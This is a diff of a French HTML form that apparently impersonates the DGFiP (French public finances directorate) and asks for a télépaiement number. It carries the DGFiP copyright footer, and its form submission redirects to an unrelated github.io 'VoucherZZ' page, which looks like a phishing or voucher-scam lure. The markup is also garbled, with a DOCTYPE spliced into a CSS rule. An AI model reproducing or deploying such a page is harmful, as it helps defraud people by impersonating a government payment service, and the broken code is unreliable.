@@ -7,7 +7,7 @@
     <style>
         body {
             font-fami<!DOCTYPE html>
-<html lang="fr">
+
 
 <body>
    
@@ -15,8 +15,7 @@
    
  
     </div>
-</body>
-</html>
+
             text-align: center;
         }
         .header {
@@ -62,8 +61,7 @@
   
   
   
-</body>
-</html>
+
     <div class="form-container">
         <h2>Saisie du numéro de télépaiement</h2>
           <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
@@ -92,8 +90,7 @@
                                      
                                      
                                      
-                   <p><p>
-             <p><p><p><div class="footer-copyright"><p> © Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p></div>                             
+     Mentions légales</a>                     
                                      
                                      
     </div>
